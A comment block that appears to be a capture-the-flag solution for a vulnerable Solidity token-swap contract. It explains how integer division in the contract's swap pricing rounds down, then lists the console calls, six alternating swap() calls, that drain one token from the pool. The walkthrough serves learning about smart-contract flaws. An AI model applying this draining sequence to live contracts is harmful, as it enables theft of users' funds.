/*
Solidity inability to comprehend floating points (e.g. 24.44444, rounds down to 24) will be abused here.

In the "getSwapPrice" function the price is calculated by dividing 2 numbers, which would work fine IF solidity was able to work with decimals.

Fix: Usually tokenprices are * by their decimals (usually 18).


Solution: 

Keep on calling swap() with all your available tokens -> due to the rounding you will keep
ending up with more tokens than you should. After a certain amount of swaps you will end having all tokens of one kind.

The actual code:

1. await contract.approve(contract.address, 500)

2. t1 = await contract.token1()
   t2 = await contract.token2()

3. await contract.swap(t1, t2, 10)
  await contract.swap(t2, t1, 20)
  await contract.swap(t1, t2, 24)
  await contract.swap(t2, t1, 30)
  await contract.swap(t1, t2, 41)
  await contract.swap(t2, t1, 45)


*/
